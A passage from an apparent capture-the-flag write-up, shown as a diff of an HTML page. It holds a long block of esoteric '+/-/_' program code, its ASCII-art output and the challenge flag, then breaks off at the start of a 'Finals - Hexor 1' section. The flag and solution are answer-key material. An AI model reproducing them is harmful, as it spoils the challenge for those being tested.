+<span style="color:#f92672">-+-</span>_<span style="color:#f92672">+</span>____<span style="color:#f92672">-++-++++</span>__<span style="color:#f92672">-+</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">++-+</span>____<span style="color:#f92672">+</span>___<span style="color:#f92672">-</span>__<span style="color:#f92672">-</span>___<span style="color:#f92672">-</span>_<span style="color:#f92672">-+-+</span>__<span style="color:#f92672">+---++</span>_<span style="color:#f92672">---++</span>_<span style="color:#f92672">+-+-</span>\
+<span style="color:#f92672">++</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-+--</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">-+</span>__<span style="color:#f92672">++</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">-</span>__<span style="color:#f92672">++--+</span>_<span style="color:#f92672">-+---++</span>_<span style="color:#f92672">--++-+--++</span>_<span style="color:#f92672">+--</span>__<span style="color:#f92672">-</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-++-----+</span>__<span style="color:#f92672">-</span>\
+_____<span style="color:#f92672">-</span>___<span style="color:#f92672">++</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-+-</span>_<span style="color:#f92672">+++</span>_<span style="color:#f92672">--+++-++++</span>_<span style="color:#f92672">+-</span>_<span style="color:#f92672">++-++</span>_<span style="color:#f92672">-+</span>___<span style="color:#f92672">+--+</span>____<span style="color:#f92672">+-</span>__<span style="color:#f92672">-</span>__<span style="color:#f92672">-</span>__<span style="color:#f92672">+-</span>_<span style="color:#f92672">-+-</span>\
+<span style="color:#f92672">+</span>__<span style="color:#f92672">----++</span>_<span style="color:#f92672">--</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">+-+-</span>____<span style="color:#f92672">--+--</span>_<span style="color:#f92672">++-+</span>_<span style="color:#f92672">+-</span>__<span style="color:#f92672">-</span>_<span style="color:#f92672">++</span>_<span style="color:#f92672">--+-+</span>_<span style="color:#f92672">--+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+-++</span>_<span style="color:#f92672">+++--++---</span>\
+<span style="color:#f92672">+</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+</span>__<span style="color:#f92672">++</span>__<span style="color:#f92672">-</span> _<span style="color:#f92672">--</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">+</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">-++</span>_<span style="color:#f92672">--+--++-</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">-</span> <span style="color:#f92672">+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+---</span>__<span style="color:#f92672">--++++</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">+</span>\
+___<span style="color:#f92672">-++</span>_<span style="color:#f92672">--</span>_<span style="color:#f92672">-++-</span>_<span style="color:#f92672">---</span>_<span style="color:#f92672">++</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">-</span>__<span style="color:#f92672">--+-</span>_<span style="color:#f92672">-</span>__<span style="color:#f92672">--</span>___<span style="color:#f92672">+-</span>__<span style="color:#f92672">+</span>___<span style="color:#f92672">-++</span>____<span style="color:#f92672">+</span> <span style="color:#f92672">+</span>_<span style="color:#f92672">---</span>_<span style="color:#f92672">-+</span>__<span style="color:#f92672">++</span>\
+___<span style="color:#f92672">++-+</span>_<span style="color:#f92672">+-</span>___<span style="color:#f92672">-+--+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">------+-</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">-</span>____<span style="color:#f92672">---</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">-+--</span>___<span style="color:#f92672">-</span>_<span style="color:#f92672">+++---++</span>__<span style="color:#f92672">-</span>_<span style="color:#f92672">+</span>_\
+<span style="color:#f92672">+</span>___<span style="color:#f92672">--++++</span>___<span style="color:#f92672">+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-+</span>_____<span style="color:#f92672">-++</span>_<span style="color:#f92672">-</span>__<span style="color:#f92672">-++-</span>_<span style="color:#f92672">--+</span>_<span style="color:#f92672">++</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-</span>____<span style="color:#f92672">--+-</span>_<span style="color:#f92672">--</span>_<span style="color:#f92672">--</span>___<span style="color:#f92672">+-+</span>_<span style="color:#f92672">+</span>___\
+<span style="color:#f92672">-+-</span>_<span style="color:#f92672">+</span>__<span style="color:#f92672">++</span>_<span style="color:#f92672">--++-</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">+----</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+-</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">--++</span>___<span style="color:#f92672">--+++</span>_<span style="color:#f92672">+</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-+-</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">--+</span>_<span style="color:#f92672">+-+</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">+</span>\
+<span style="color:#f92672">++</span>_<span style="color:#f92672">++</span>___<span style="color:#f92672">-</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-++</span>_<span style="color:#f92672">-+-+</span>_<span style="color:#f92672">++</span>__<span style="color:#f92672">+-</span>_<span style="color:#f92672">+-+---+-+</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">+---+--+</span>_<span style="color:#f92672">---+</span>_<span style="color:#f92672">+++</span>_<span style="color:#f92672">+-</span>_<span style="color:#f92672">--</span>__<span style="color:#f92672">-+</span>\
+_<span style="color:#f92672">+-</span>_<span style="color:#f92672">+</span>__<span style="color:#f92672">++-</span> _<span style="color:#f92672">-+</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">-+</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">---++</span>_<span style="color:#f92672">+-</span>__<span style="color:#f92672">-</span>_<span style="color:#f92672">+</span>___<span style="color:#f92672">++++-+++++++</span>_<span style="color:#f92672">--+</span>_<span style="color:#f92672">-++-</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">++-+</span>__<span style="color:#f92672">+</span>\
+__<span style="color:#f92672">-</span>__<span style="color:#f92672">-</span>_<span style="color:#f92672">+--</span>_<span style="color:#f92672">-+-</span>_<span style="color:#f92672">+--</span>_<span style="color:#f92672">-+++-+++-</span>__<span style="color:#f92672">+-</span>_<span style="color:#f92672">--</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">++</span>_<span style="color:#f92672">+-+</span>_<span style="color:#f92672">+--</span>_<span style="color:#f92672">+</span>__<span style="color:#f92672">++</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">--------+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-+</span>\
+<span style="color:#f92672">-</span>__<span style="color:#f92672">++++-</span>_<span style="color:#f92672">+--</span>__<span style="color:#f92672">-+-</span>__<span style="color:#f92672">-+-++-+-</span>_<span style="color:#f92672">+++</span>__<span style="color:#f92672">+--+</span>_<span style="color:#f92672">-</span>__<span style="color:#f92672">++-+</span>_<span style="color:#f92672">-++++-</span>___<span style="color:#f92672">++</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">-+--</span>_<span style="color:#f92672">--</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-</span>\
+<span style="color:#f92672">-+-</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+---</span>_<span style="color:#f92672">++</span>_<span style="color:#f92672">+--+</span>_<span style="color:#f92672">--</span>__<span style="color:#f92672">--</span>_<span style="color:#f92672">--++-</span>_<span style="color:#f92672">-</span>___<span style="color:#f92672">++</span>_<span style="color:#f92672">+--++</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+---</span>_<span style="color:#f92672">--+</span>_<span style="color:#f92672">--+-+</span>_<span style="color:#f92672">++-++++</span>\
+<span style="color:#f92672">+</span>_<span style="color:#f92672">---</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">++</span>__<span style="color:#f92672">-+-</span>__<span style="color:#f92672">++</span>__<span style="color:#f92672">-</span>_<span style="color:#f92672">--+-</span>_<span style="color:#f92672">+-+</span>_<span style="color:#f92672">+-</span>_<span style="color:#f92672">-</span>__<span style="color:#f92672">+-+</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">-+-</span>_<span style="color:#f92672">++</span>_<span style="color:#f92672">---</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+-</span>_<span style="color:#f92672">++-++---+</span>\
+_<span style="color:#f92672">-</span>_<span style="color:#f92672">---</span>_<span style="color:#f92672">++++--</span>__<span style="color:#f92672">--</span>_<span style="color:#f92672">++-----</span>_<span style="color:#f92672">++</span>_<span style="color:#f92672">+-</span>___<span style="color:#f92672">--</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+--+</span>_<span style="color:#f92672">-++-</span>_<span style="color:#f92672">-+----</span>_<span style="color:#f92672">-++++-+</span>____<span style="color:#f92672">-</span>_<span style="color:#f92672">--</span>\
+___<span style="color:#f92672">-</span>_<span style="color:#f92672">+-</span>_<span style="color:#f92672">+-+-</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">++</span>_<span style="color:#f92672">++</span>___<span style="color:#f92672">--++--</span>__<span style="color:#f92672">++</span>_<span style="color:#f92672">+</span>__<span style="color:#f92672">+-</span>_<span style="color:#f92672">--+</span>__<span style="color:#f92672">-+</span>_<span style="color:#f92672">+-</span>_<span style="color:#f92672">++--+</span>_<span style="color:#f92672">+--+</span>_<span style="color:#f92672">+-</span>_<span style="color:#f92672">-+-</span>_<span style="color:#f92672">++</span>\
+<span style="color:#f92672">+</span>__<span style="color:#f92672">+-+-+</span>_<span style="color:#f92672">-+-+-</span>_<span style="color:#f92672">--++</span>__<span style="color:#f92672">-</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">++---</span>__<span style="color:#f92672">-+</span>_<span style="color:#f92672">+-++---++</span>__<span style="color:#f92672">+--+--+</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+-+</span>_<span style="color:#f92672">-</span>__<span style="color:#f92672">---</span>\
+<span style="color:#f92672">+--+</span>_<span style="color:#f92672">++</span>__<span style="color:#f92672">+-++</span>__<span style="color:#f92672">--</span>_<span style="color:#f92672">-</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+-+--+-+</span>_<span style="color:#f92672">+-+++-+--++-</span>_<span style="color:#f92672">---+++++-++</span>_<span style="color:#f92672">---</span>_<span style="color:#f92672">--</span>_<span style="color:#f92672">++-</span>_<span style="color:#f92672">+</span>\
+<span style="color:#f92672">-+</span>_<span style="color:#f92672">++</span>_<span style="color:#f92672">-++-+</span>_<span style="color:#f92672">+-</span>_<span style="color:#f92672">+---</span>__<span style="color:#f92672">-+</span>_<span style="color:#f92672">++</span>__<span style="color:#f92672">-</span>_<span style="color:#f92672">-+----</span>_<span style="color:#f92672">-+-</span>_<span style="color:#f92672">+++</span>_<span style="color:#f92672">-+++</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">--++-</span>_<span style="color:#f92672">-+++</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+-</span>_<span style="color:#f92672">+--</span>\
+<span style="color:#f92672">--++++-</span>_<span style="color:#f92672">+</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">------</span>_<span style="color:#f92672">--</span>___<span style="color:#f92672">++</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">+</span>__<span style="color:#f92672">+--++</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-++</span>_<span style="color:#f92672">+</span>___<span style="color:#f92672">++</span>_<span style="color:#f92672">---+-+</span>_<span style="color:#f92672">+++</span>__<span style="color:#f92672">+--+</span>__\
+<span style="color:#f92672">--</span>_<span style="color:#f92672">-</span>__<span style="color:#f92672">-+-+</span>_<span style="color:#f92672">-+--+-+--+++</span>_<span style="color:#f92672">--</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-+------+</span>_<span style="color:#f92672">+++</span>_<span style="color:#f92672">-</span>__<span style="color:#f92672">+++</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">--</span>__<span style="color:#f92672">-</span>_<span style="color:#f92672">+</span>__<span style="color:#f92672">+</span>___<span style="color:#f92672">+</span>_<span style="color:#f92672">-</span>\
+<span style="color:#f92672">-</span>___<span style="color:#f92672">++-</span>____<span style="color:#f92672">-+</span>____<span style="color:#f92672">-</span>__<span style="color:#f92672">++-+-+</span>_<span style="color:#f92672">+</span>__<span style="color:#f92672">-+-+</span>_<span style="color:#f92672">+</span>__<span style="color:#f92672">----+-</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">++</span>_<span style="color:#f92672">-</span>____<span style="color:#f92672">-++</span>_<span style="color:#f92672">--</span>_<span style="color:#f92672">+---</span>_\
+<span style="color:#f92672">-</span>_<span style="color:#f92672">+---</span>__<span style="color:#f92672">+----+-</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">++-</span>_<span style="color:#f92672">---+--</span>___<span style="color:#f92672">++-</span>__<span style="color:#f92672">+-+++</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">+-+-</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+</span>__<span style="color:#f92672">+----++</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-</span>\
+____<span style="color:#f92672">+--+-</span>_<span style="color:#f92672">+-</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">+--+</span>__<span style="color:#f92672">-</span>_<span style="color:#f92672">--</span>_<span style="color:#f92672">+-+</span>_<span style="color:#f92672">+-</span>_<span style="color:#f92672">+-+++</span>__<span style="color:#f92672">++</span>_<span style="color:#f92672">+-</span>___<span style="color:#f92672">-</span>___<span style="color:#f92672">++-</span>__<span style="color:#f92672">+-+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-</span>___<span style="color:#f92672">+-+</span>\
+_<span style="color:#f92672">--</span>__<span style="color:#f92672">-</span>_<span style="color:#f92672">++</span>__<span style="color:#f92672">-</span>__<span style="color:#f92672">+--</span>_<span style="color:#f92672">+-++</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">--++-</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">+--</span>_<span style="color:#f92672">+-</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">-</span>___<span style="color:#f92672">++-+-</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">-</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">+---+-+</span>\
+<span style="color:#f92672">-</span>___<span style="color:#f92672">++++--+--</span>_<span style="color:#f92672">--</span>_<span style="color:#f92672">--</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">++</span>_<span style="color:#f92672">---++</span>_<span style="color:#f92672">+-</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">+</span>____<span style="color:#f92672">++---+-+-+-+</span>__<span style="color:#f92672">+--</span>_<span style="color:#f92672">++--</span>_\
+<span style="color:#f92672">-</span>__<span style="color:#f92672">++++</span>_<span style="color:#f92672">-+--</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">--+++</span>_<span style="color:#f92672">+-++</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-++</span>_<span style="color:#f92672">----+</span>_<span style="color:#f92672">+++++</span>__<span style="color:#f92672">+++--</span>_<span style="color:#f92672">+</span>__<span style="color:#f92672">-+</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">--+-+-+</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">-</span>\
+<span style="color:#f92672">+--</span>___<span style="color:#f92672">+</span>_<span style="color:#f92672">-</span>__<span style="color:#f92672">----+</span>_<span style="color:#f92672">+-++</span>_<span style="color:#f92672">+</span>____<span style="color:#f92672">+-</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-</span>__<span style="color:#f92672">-</span>_<span style="color:#f92672">+-+</span>_<span style="color:#f92672">++</span>_<span style="color:#f92672">+-------</span>__<span style="color:#f92672">+</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">+-</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">-</span>___<span style="color:#f92672">+-</span>_\
+<span style="color:#f92672">+-</span>__<span style="color:#f92672">++</span>_<span style="color:#f92672">+</span>__<span style="color:#f92672">++++++</span>__<span style="color:#f92672">-</span>__<span style="color:#f92672">-</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+-++++</span>_<span style="color:#f92672">+</span>__<span style="color:#f92672">+-</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+-</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+---+</span>__<span style="color:#f92672">+---</span>_<span style="color:#f92672">---</span>__ <span style="color:#f92672">+</span>__<span style="color:#f92672">---</span>\
+__<span style="color:#f92672">-</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-</span>__<span style="color:#f92672">+-</span>__<span style="color:#f92672">--+-</span>__<span style="color:#f92672">+++-</span>____<span style="color:#f92672">-</span>__<span style="color:#f92672">-+-</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+-++--</span>_<span style="color:#f92672">+</span>__<span style="color:#f92672">+-</span>___<span style="color:#f92672">-</span>__<span style="color:#f92672">-</span>_<span style="color:#f92672">+-</span>_<span style="color:#f92672">-</span>___<span style="color:#f92672">+---+</span>_\
+<span style="color:#f92672">-</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+</span>___<span style="color:#f92672">+-++-++++-</span>__<span style="color:#f92672">---+</span>_<span style="color:#f92672">-+--+</span>__<span style="color:#f92672">++</span>_<span style="color:#f92672">--+--</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">++</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-++</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">++</span>_<span style="color:#f92672">++-</span>___<span style="color:#f92672">+-++---</span>\
+<span style="color:#f92672">-</span>_<span style="color:#f92672">-++--</span>_<span style="color:#f92672">++</span>_<span style="color:#f92672">+---</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">--+</span>__<span style="color:#f92672">-</span>__<span style="color:#f92672">--++</span>__<span style="color:#f92672">-+-+</span>_<span style="color:#f92672">++--+-+</span>_<span style="color:#f92672">+--++--</span>_<span style="color:#f92672">---++--</span>__<span style="color:#f92672">+-+---</span>__\
+<span style="color:#f92672">++</span>_<span style="color:#f92672">++</span>__<span style="color:#f92672">-</span>__<span style="color:#f92672">+++--</span>_<span style="color:#f92672">-+--+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-++++</span>__<span style="color:#f92672">--++-</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+-++----+++</span>_<span style="color:#f92672">--+</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+---</span>_<span style="color:#f92672">-</span>\
+<span style="color:#f92672">-</span>_<span style="color:#f92672">-+-+</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">++</span>__<span style="color:#f92672">--++</span>_<span style="color:#f92672">+--++</span>_<span style="color:#f92672">+</span>___<span style="color:#f92672">-</span>_<span style="color:#f92672">----+-+-+</span>_<span style="color:#f92672">+</span>__<span style="color:#f92672">+----+--</span>_<span style="color:#f92672">-</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">-+---</span>_<span style="color:#f92672">---+</span>\
+<span style="color:#f92672">++</span>_<span style="color:#f92672">++-</span>_<span style="color:#f92672">++</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">----</span>_<span style="color:#f92672">+++</span>__<span style="color:#f92672">++</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">-</span>___<span style="color:#f92672">+--++-</span>_<span style="color:#f92672">-</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+--</span>_<span style="color:#f92672">----+++</span>_<span style="color:#f92672">+-+</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">--+-+-</span>\
+_<span style="color:#f92672">--</span>__<span style="color:#f92672">+---</span>_<span style="color:#f92672">+-++--+</span>_<span style="color:#f92672">----</span>__<span style="color:#f92672">+--++</span>__<span style="color:#f92672">-+-+</span>_<span style="color:#f92672">+</span>__<span style="color:#f92672">++++---+-+---+</span>__<span style="color:#f92672">+---+</span>_<span style="color:#f92672">--</span>_<span style="color:#f92672">-</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">++</span>\
+_<span style="color:#f92672">-+---</span>__<span style="color:#f92672">--+++</span>_<span style="color:#f92672">++</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">---+</span>_<span style="color:#f92672">+++++</span>__<span style="color:#f92672">+++--</span>_<span style="color:#f92672">+</span>__<span style="color:#f92672">-+</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">--+-+-++</span>__<span style="color:#f92672">+++--</span>_<span style="color:#f92672">-+</span>_\
+<span style="color:#f92672">--</span>_<span style="color:#f92672">--</span>__<span style="color:#f92672">+-+</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">+++</span>_<span style="color:#f92672">--++</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+</span>___<span style="color:#f92672">-</span>__<span style="color:#f92672">---+-+</span>_<span style="color:#f92672">+-+</span>__<span style="color:#f92672">+----+--</span>_<span style="color:#f92672">-</span>__<span style="color:#f92672">-</span>_<span style="color:#f92672">++</span>_<span style="color:#f92672">-+----</span>\
+_<span style="color:#f92672">--+++</span>_<span style="color:#f92672">-+++</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">-----+</span>_<span style="color:#f92672">+-+</span>_<span style="color:#f92672">+</span>__<span style="color:#f92672">+++++</span>_<span style="color:#f92672">--</span>_<span style="color:#f92672">-+</span>__<span style="color:#f92672">-</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-++</span>_<span style="color:#f92672">+-</span>_<span style="color:#f92672">--++-</span>___<span style="color:#f92672">++</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+-+</span>\
+__<span style="color:#f92672">+--+++---+-+-+</span>___<span style="color:#f92672">-</span>_<span style="color:#f92672">--+++---</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">+-</span>_<span style="color:#f92672">+</span>___<span style="color:#f92672">++-</span>__<span style="color:#f92672">-+</span>_<span style="color:#f92672">++</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+-+++++----+-</span>_\
+<span style="color:#f92672">++++</span>__<span style="color:#f92672">++</span>_<span style="color:#f92672">+</span>__<span style="color:#f92672">+</span>__<span style="color:#f92672">-+</span>_<span style="color:#f92672">--</span>_<span style="color:#f92672">---+-+--</span>_<span style="color:#f92672">++</span>_<span style="color:#f92672">++-+-</span>_<span style="color:#f92672">+-</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-+-</span>_<span style="color:#f92672">--</span>_<span style="color:#f92672">-+</span>___<span style="color:#f92672">++</span>_<span style="color:#f92672">--</span>_<span style="color:#f92672">--+-+</span>_<span style="color:#f92672">++-</span>\
+<span style="color:#f92672">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span>\
+<span style="color:#f92672">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++-</span>__<span style="color:#f92672">++</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">++</span>\
+<span style="color:#f92672">+++--+--</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+-</span>_<span style="color:#f92672">+--++</span>_<span style="color:#f92672">--</span>_<span style="color:#f92672">---</span>___<span style="color:#f92672">+--</span>_<span style="color:#f92672">-+---+++</span>_<span style="color:#f92672">++-++</span>_<span style="color:#f92672">-+-+------+--</span>__<span style="color:#f92672">-+</span>_<span style="color:#f92672">--+</span>\
+<span style="color:#f92672">+--++</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">---</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">-</span>___<span style="color:#f92672">-+-+</span>_<span style="color:#f92672">-+-+-+--</span>_<span style="color:#f92672">+-</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-+--+</span>_<span style="color:#f92672">-</span>___<span style="color:#f92672">++--</span>___<span style="color:#f92672">-++</span>_<span style="color:#f92672">+</span>___<span style="color:#f92672">+-+</span>_<span style="color:#f92672">+++--</span>\
+<span style="color:#f92672">--+</span>_<span style="color:#f92672">++-</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">-+--+-</span>_<span style="color:#f92672">+-</span>___<span style="color:#f92672">-</span>_<span style="color:#f92672">-+++</span>__<span style="color:#f92672">+</span>___<span style="color:#f92672">-+-+-+</span>___<span style="color:#f92672">+-+-+-++----+-</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-++</span>\
+<span style="color:#f92672">+++</span>_<span style="color:#f92672">++-</span>_<span style="color:#f92672">++</span>__<span style="color:#f92672">-</span>_<span style="color:#f92672">-</span>___<span style="color:#f92672">---+</span>_<span style="color:#f92672">++--+</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">+-</span>__<span style="color:#f92672">--</span>_<span style="color:#f92672">+-++-</span>_<span style="color:#f92672">--+---+</span>__<span style="color:#f92672">+-+</span>___<span style="color:#f92672">-+-+++-</span>_\
+<span style="color:#f92672">+</span>_<span style="color:#f92672">-+-</span>_<span style="color:#f92672">-+++-</span>___<span style="color:#f92672">++++++</span>__<span style="color:#f92672">+++-</span>_<span style="color:#f92672">-+--+-</span>_<span style="color:#f92672">+-</span>_<span style="color:#f92672">+-+--</span>_<span style="color:#f92672">--++--</span>__<span style="color:#f92672">-+</span>_<span style="color:#f92672">--++--+-+</span>_<span style="color:#f92672">-+--</span>_<span style="color:#f92672">-+</span>\
+_<span style="color:#f92672">++-++++</span>__<span style="color:#f92672">----</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">--+++</span>_<span style="color:#f92672">--++</span>__<span style="color:#f92672">--</span>_<span style="color:#f92672">+</span>__<span style="color:#f92672">-</span>_<span style="color:#f92672">++</span>_<span style="color:#f92672">-</span>_____<span style="color:#f92672">+-</span>_<span style="color:#f92672">+++++--</span>_<span style="color:#f92672">--</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">--</span>__<span style="color:#f92672">+--+-</span>\
+<span style="color:#f92672">-+</span>__<span style="color:#f92672">-</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">++-+--+--------</span>_<span style="color:#f92672">-+---------</span>_<span style="color:#f92672">+-++----+---++-</span>_<span style="color:#f92672">+-+---++</span>_<span style="color:#f92672">--</span>_<span style="color:#f92672">++++++</span>\
+_<span style="color:#f92672">-++++-+--</span>_<span style="color:#f92672">+--+-+-+-+-</span>_<span style="color:#f92672">---</span>_<span style="color:#f92672">++</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+--+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+-</span>_<span style="color:#f92672">--</span>_<span style="color:#f92672">++</span>_<span style="color:#f92672">+--</span>_<span style="color:#f92672">-+---</span>_<span style="color:#f92672">+--+-------</span>\
+_<span style="color:#f92672">+-+-+-</span>__<span style="color:#f92672">-+-++--</span>__<span style="color:#f92672">---+-</span>_<span style="color:#f92672">--++</span>_<span style="color:#f92672">-</span>__<span style="color:#f92672">+--</span>_<span style="color:#f92672">+---+--</span>___<span style="color:#f92672">+--------+-+</span>_<span style="color:#f92672">+++++</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">-+--</span>_
+</code></pre></div><p>And we get the flag:</p>
+<pre tabindex="0"><code>
+                      .
+                        `:.
+                          `:.
+                  .:'     ,::
+                 .:'      ;:'
+                 ::      ;:'
+                  :    .:'
+                   `.  :.
+          _________________________
+         : _ _ _ _ _ _ _ _ _ _ _ _ :
+     ,---:&quot;.&quot;.&quot;.&quot;.&quot;.&quot;.&quot;.&quot;.&quot;.&quot;.&quot;.&quot;.&quot;:
+    : ,'&quot;`::.:.:.:.:.:.:.:.:.:.:.::'
+    `.`.  `:-===-===-===-===-===-:'
+      `.`-._:                   :
+        `-.__`.               ,'
+    ,--------`&quot;`-------------'--------.
+     `&quot;--.__                   __.--&quot;'
+            `&quot;&quot;-------------&quot;&quot;'
+
+Please eflag{it's, it's a device Morty!} 㰼㎠㎠㍡V{R
+</code></pre><h1 id="finals---hexor-1">Finals - Hexor 1</h1>
+<p>Now initially when I figured out how to solve this, I just
+gave it some input, and noticed that I could change the input
+and the output kept being the same. I figured out that only the
